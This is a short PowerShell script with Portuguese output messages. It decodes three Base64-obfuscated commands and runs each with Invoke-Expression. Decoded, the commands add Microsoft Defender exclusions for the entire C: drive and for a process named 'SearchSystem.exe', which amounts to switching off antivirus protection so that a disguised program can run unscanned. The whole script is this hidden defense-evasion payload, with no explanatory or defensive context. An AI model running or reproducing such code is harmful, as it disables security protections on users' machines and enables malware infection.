
$base64List = @(
    "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAQwA6AFwAIgANAAoA",
    "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUAByAG8AYwBlAHMAcwAgACIAUwBlAGEAcgBjAGgAUwB5AHMAdABlAG0ALgBlAHgAZQAiAA==",
    "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUAByAG8AYwBlAHMAcwAgACIAUwBlAGEAcgBjAGgAUwB5AHMAdABlAG0AIgA="
)

foreach ($b64 in $base64List) {
    try {
        $decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64))
        Invoke-Expression $decoded
        Write-Host "[i] Comando executado com sucesso:" -ForegroundColor Green
        Write-Host $decoded -ForegroundColor Yellow
    } catch {
        Write-Host "[!] Falha ao executar comando Base64:" -ForegroundColor Red
        Write-Host $_.Exception.Message
    }
}
